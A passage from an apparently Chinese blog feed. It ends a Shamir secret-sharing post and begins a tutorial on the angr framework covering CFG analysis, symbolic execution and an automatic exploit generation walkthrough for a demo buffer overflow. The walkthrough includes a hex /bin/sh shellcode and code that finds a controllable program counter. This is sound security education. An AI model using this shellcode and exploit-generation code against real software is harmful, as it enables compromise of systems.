61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(3431.5, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(3820.5, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4209.5, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(4832.3, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(5888.1, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(6388.1, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(6832.7, 0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(7332.7, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(7777.4, 0)"><path data-c="22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"></path></g><g data-mml-node="mo" transform="translate(9116.1, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(9560.7, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(10160.7, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，称<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="1.842ex" height="1.927ex" role="img" focusable="false" viewBox="0 -694 814 851.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(520, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>为部分密钥，将<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="1.842ex" height="1.927ex" role="img" focusable="false" viewBox="0 -694 814 851.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(520, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>分别通过安全的信道发送给每个分享者<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="15.933ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 7042.4 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(642, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(936, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mo" transform="translate(1325, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(2380.7, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(2880.7, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(3325.4, 0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(3825.4, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(4270.1, 0)"><path data-c="22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"></path></g><g data-mml-node="mo" transform="translate(5608.7, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(6053.4, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(6653.4, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>。</p>
<h2 id="秘密恢复-1"><a href="#秘密恢复-1" class="headerlink" title="秘密恢复"></a>秘密恢复</h2><p>如果有<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="1.179ex" height="1.595ex" role="img" focusable="false" viewBox="0 -694 521 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g></g></g></svg></mjx-container>个共享者想恢复秘密信息<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.023ex" xmlns="http://www.w3.org/2000/svg" width="1.176ex" height="1.593ex" role="img" focusable="false" viewBox="0 -694 520 704"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g></g></svg></mjx-container>，他们分别拿出自己的<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="1.842ex" height="1.927ex" role="img" focusable="false" viewBox="0 -694 814 851.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(520, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>，然后利用Lagrange插值公式：</p>
<script type="math/tex; mode=display">h(x)=\sum_{i=1}^td_i\lambda_{x,i}</script><p>其中$\lambda<em>{x,i}=\prod</em>{k=1,k\neq j}^t\frac{i-k}{j-k}<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex" xmlns="http://www.w3.org/2000/svg" width="4.072ex" height="2.149ex" role="img" focusable="false" viewBox="0 -750 1800 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><text data-variant="normal" transform="matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">，</text><text data-variant="normal" transform="translate(900, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">由</text></g></g></g></svg></mjx-container>d=f(0)=h(0)<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex" xmlns="http://www.w3.org/2000/svg" width="12.217ex" height="2.149ex" role="img" focusable="false" viewBox="0 -750 5400 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><text data-variant="normal" transform="matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">得</text><text data-variant="normal" transform="translate(900, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">到</text><text data-variant="normal" transform="translate(1800, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">秘</text><text data-variant="normal" transform="translate(2700, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">密</text><text data-variant="normal" transform="translate(3600, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">信</text><text data-variant="normal" transform="translate(4500, 0) matrix(1 0 0 -1 0 0)" font-size="884px" font-family="serif">息</text></g></g></g></svg></mjx-container>d$。</p>
]]></content>
      <categories>
        <category>密码学基础</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>数字签名</tag>
      </tags>
  </entry>
  <entry>
    <title>符号执行相关-Angr</title>
    <url>/2020/06/25/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E7%9B%B8%E5%85%B3-Angr/</url>
    <content><![CDATA[<p>总结一下<code>angr</code>在静态分析、符号执行、fuzz和AEG（Automatic Exploit Generation，漏洞利用自动化）中的相关应用。</p>
<span id="more"></span>
<h1 id="Angr相关应用"><a href="#Angr相关应用" class="headerlink" title="Angr相关应用"></a>Angr相关应用</h1><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>加载二进制文件并进行分析，相较于IDA（<code>Call</code>不为分割基本块的标准）、Clang（）等工具以函数为单位生成CFG图，Angr可以直接获取整个二进制文件的CFG图。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">binary = <span class="string">'/usr/bin/base64'</span></span><br><span class="line">p = angr.Project(binary, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">cfg = p.analyses.CFGFast() <span class="comment"># 首选</span></span><br><span class="line"><span class="comment"># main = p.loader.main_object.get_symbol("main")</span></span><br><span class="line"><span class="comment"># cfg = p.analyses.CFGEmulated(fail_fast=True, starts=[main.rebased_addr])</span></span><br><span class="line">p.entry</span><br></pre></td></tr></table></figure>
<p>获取函数，<code>cfg.kb.functions</code>和<code>cfg.functions</code>功能一致。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">cfg.kb.functions.items() <span class="comment"># 函数迭代器</span></span><br><span class="line">f = cfg.kb.functions.get(<span class="string">'main'</span>) <span class="comment"># 根据函数名取函数</span></span><br><span class="line">f = cfg.kb.functions.get_by_addr(<span class="number">0x402e10</span>)</span><br><span class="line"></span><br><span class="line">f.get_call_sites() <span class="comment"># 函数中所有以call结尾的block地址</span></span><br><span class="line">f.block_addrs <span class="comment"># 函数所有基本块地址</span></span><br><span class="line">f.size</span><br><span class="line">f.name</span><br></pre></td></tr></table></figure>
<p>获取基本块。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">f.blocks <span class="comment"># 函数中所有block的迭代器，Angr的分析会丢掉一些block，必要时需要手动添加额外分析</span></span><br><span class="line"></span><br><span class="line">cfg.graph.nodes() <span class="comment"># 所有node的迭代器</span></span><br><span class="line">node = cfg.get_node(<span class="number">0x403162</span>) <span class="comment"># 根据地址定位node</span></span><br><span class="line">node.block <span class="comment"># 获取node对应的block</span></span><br><span class="line">node.successors <span class="comment"># block所有的后续block（全局范围），递归遍历时注意陷入循环</span></span><br><span class="line">node.predecessors</span><br><span class="line">node.has_return <span class="comment"># 包含ret</span></span><br><span class="line"></span><br><span class="line">b.pp() <span class="comment"># block对应的反汇编指令</span></span><br><span class="line">b.instructions <span class="comment"># 指令数量</span></span><br><span class="line">b.capstone.insns[i].insn.insn_name() <span class="comment"># 指令名称，如nop</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查block是否全为nop（用于对齐）</span></span><br><span class="line"><span class="comment"># all([blk.capstone.insns[i].insn.insn_name() == 'nop' for i in range(blk.instructions)])</span></span><br><span class="line"></span><br><span class="line">b.size</span><br><span class="line">b.addr</span><br></pre></td></tr></table></figure>
<p>绘制CFG图（不推荐，耗时较长）。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> angrutils <span class="keyword">import</span> *</span><br><span class="line">plot_cfg(cfg, <span class="string">"test"</span>, asminst=<span class="literal">True</span>, remove_imports=<span class="literal">True</span>, remove_path_terminator=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<h2 id="符号执行基础应用"><a href="#符号执行基础应用" class="headerlink" title="符号执行基础应用"></a>符号执行基础应用</h2><p>参见<a href="https://www.freebuf.com/articles/web/150296.html">符号执行：利用Angr进行简单CTF逆向分析</a>，利用程序输出特定字符串作为约束来求解对应程序输入。</p>
<p>注意Angr在遇到某些函数时不能正常工作，比如<code>_exit(0)</code>，而能正确处理<code>exit(0)</code>。</p>
<h2 id="AEG"><a href="#AEG" class="headerlink" title="AEG"></a>AEG</h2><p><a href="https://github.com/angr/angr-doc/tree/master/examples/insomnihack_aeg">insomnihack_aeg</a>，参考<a href="https://xz.aliyun.com/t/7199">基于 angr 的漏洞利用自动生成之缓冲区溢出案例分析</a>。</p>
<ul>
<li><code>demo_bin.c</code>：结构体中数组溢出覆盖函数指针</li>
<li><code>solve.py</code>：求解直接生成exploit（改动部分代码），覆盖PC为保存shellcode的地址</li>
</ul>
<ol>
<li>初始化state和SIM。</li>
</ol>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p = angr.Project(binary)</span><br><span class="line">extras = {</span><br><span class="line">    so.REVERSE_MEMORY_NAME_MAP, <span class="comment"># 保留符号变量到内存地址的映射</span></span><br><span class="line">    so.TRACK_ACTION_HISTORY <span class="comment"># 保留路径上的state历史</span></span><br><span class="line">}</span><br><span class="line">es = p.factory.entry_state(add_options=extras) <span class="comment"># 从入口点开始的state</span></span><br><span class="line">sm = p.factory.simulation_manager(es, save_unconstrained=<span class="literal">True</span>) <span class="comment"># 保存unconstrained state，即指令指针被用户数据或符号化数据控制</span></span><br></pre></td></tr></table></figure>
<ol>
<li>寻找<code>PC</code>寄存器全部符号化（可被输入控制）的状态。</li>
</ol>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">exploitable_state = <span class="literal">None</span></span><br><span class="line"><span class="keyword">while</span> exploitable_state <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    sm.step() <span class="comment"># 执行一个基本块</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sm.unconstrained) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> sm.unconstrained:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">all</span>([u.solver.symbolic(u.regs.pc[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(u.arch.bits)]): <span class="comment"># 该state中PC的每个bit均被符号化</span></span><br><span class="line">                exploitable_state = u</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        sm.drop(stash=<span class="string">'unconstrained'</span>)</span><br><span class="line"></span><br><span class="line">ep = exploitable_state</span><br></pre></td></tr></table></figure>
<ol>
<li>寻找一块可以存放shellcode的完全符号化内存空间，并建立全部约束。</li>
</ol>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_symbolic_buffer</span>(<span class="params">state, length</span>):</span></span><br><span class="line">    sym_addrs = [ ]</span><br><span class="line">    <span class="keyword">for</span> _, symbol <span class="keyword">in</span> state.solver.get_variables(<span class="string">'file'</span>, state.posix.stdin.ident): <span class="comment"># 从state.posix.stdin.ident（'stdin'）寻找以file开头的符号化变量名?</span></span><br><span class="line">        sym_addrs.extend(state.memory.addrs_for_name(<span class="built_in">next</span>(<span class="built_in">iter</span>(symbol.variables)))) <span class="comment"># 符号化变量对应的内存地址</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> sym_addrs:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>([ (addr + i) <span class="keyword">in</span> sym_addrs <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length)]): <span class="comment"># 确保连续空间</span></span><br><span class="line">            <span class="keyword">yield</span> addr</span><br><span class="line"></span><br><span class="line">shellcode = <span class="built_in">bytes</span>.fromhex(<span class="string">"6a68682f2f2f73682f62696e89e331c96a0b5899cd80"</span>)</span><br><span class="line"><span class="comment"># from capstone import *</span></span><br><span class="line"><span class="comment"># for i in Cs(CS_ARCH_X86, CS_MODE_64).disasm(shellcode, 